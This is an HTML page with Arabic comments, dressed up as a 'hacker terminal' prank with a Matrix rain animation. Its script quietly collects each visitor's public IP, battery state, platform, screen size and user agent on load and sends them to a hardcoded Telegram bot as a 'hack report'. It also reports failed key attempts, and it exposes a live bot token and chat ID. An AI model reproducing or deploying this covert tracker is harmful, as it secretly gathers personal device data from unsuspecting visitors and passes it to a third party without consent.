<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORE TERMINAL v11.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; height: 100vh; margin: 0; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
        .container { position: relative; z-index: 1; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .terminal { width: 100%; max-width: 450px; background: rgba(0,20,0,0.9); border: 1px solid #0f0; padding: 20px; text-align: left; font-size: 12px; border-radius: 5px; box-shadow: 0 0 20px #0f0; }
        .btn-hack { background: #f00; color: #fff; border: none; padding: 15px 30px; margin-top: 20px; cursor: pointer; font-weight: bold; border-radius: 5px; box-shadow: 0 0 15px #f00; }
        #hacker-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; z-index: 999; white-space: pre-wrap; font-size: 13px; overflow-y: auto; }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>

    <div id="main-content" class="container" style="display:none;">
        <div class="terminal">
            <p style="color: #fff; font-weight: bold; margin-bottom: 10px;">[ CENTRAL INTELLIGENCE TERMINAL ]</p>
            <p>> Detecting Target Device... <span id="dev-info">Searching...</span></p>
            <p id="ip-info">> Fetching Public IP...</p>
            <p id="bat-info">> Checking Battery Status...</p>
            <p>> Security Layer: Bypass Active</p>
            <p style="color: yellow; margin-top: 10px;">Waiting for final execution...</p>
        </div>
        <button class="btn-hack" onclick="startHacking()">START EXTRACTION ⚡</button>
    </div>

    <div id="hacker-screen"><div id="hack-text"></div></div>

    <script>
        const TELEGRAM_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
        const CHAT_ID = "7772577035";
        const SECRET_KEY = "0777F";

        async function getFullData() {
            // 1. جلب الآيبي الحقيقي
            let ipData = { ip: "Unknown" };
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                ipData = await response.json();
            } catch (e) {}

            // 2. جلب معلومات البطارية
            let batteryInfo = "Unknown";
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
            } catch (e) {}

            // 3. تجميع التقرير النهائي
            let report = `
🚨 **تقرير اختراق جديد** 🚨
-------------------------
🌐 **الآيبي:** ${ipData.ip}
📱 **الجهاز:** ${navigator.platform}
🔋 **الشحن:** ${batteryInfo}
🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
🌍 **المتصفح:** ${navigator.userAgent}
⏰ **الوقت:** ${new Date().toLocaleString('ar-IQ')}
-------------------------`;

            return report;
        }

        async function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        window.onload = async function() {
            let userPass = prompt("ENTER ACCESS KEY:");
            if (userPass === SECRET_KEY) {
                document.getElementById('main-content').style.display = 'flex';
                let data = await getFullData();
                sendToTelegram(data); // إرسال المعلومات الحقيقية فور الدخول

                // تحديث الواجهة بمعلومات حقيقية
                document.getElementById('dev-info').innerText = navigator.platform;
                document.getElementById('ip-info').innerText = "> IP Address: Identified";
            } else {
                sendToTelegram("❌ محاولة دخول فاشلة للموقع.");
                document.body.innerHTML = "<h1>ACCESS DENIED</h1>";
            }
        };

        // (كود المصفوفة والمقلب يبقى كما هو لزيادة الأكشن)
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width/14)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = "14px arial";
            drops.forEach((y, i) => {
                ctx.fillText(String.fromCharCode(Math.random() * 128), i * 14, y * 14);
                if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 35);

        function startHacking() {
            document.getElementById('hacker-screen').style.display = 'block';
            let lines = ["> INITIALIZING...", "> ACCESSING SYSTEM...", "> DATA EXFILTRATED!"];
            let i = 0;
            function add() {
                if(i < lines.length) {
                    document.getElementById('hack-text').innerHTML += lines[i++] + "\n";
                    setTimeout(add, 800);
                }
            }
            add();
        }
    </script>
</body>
</html>
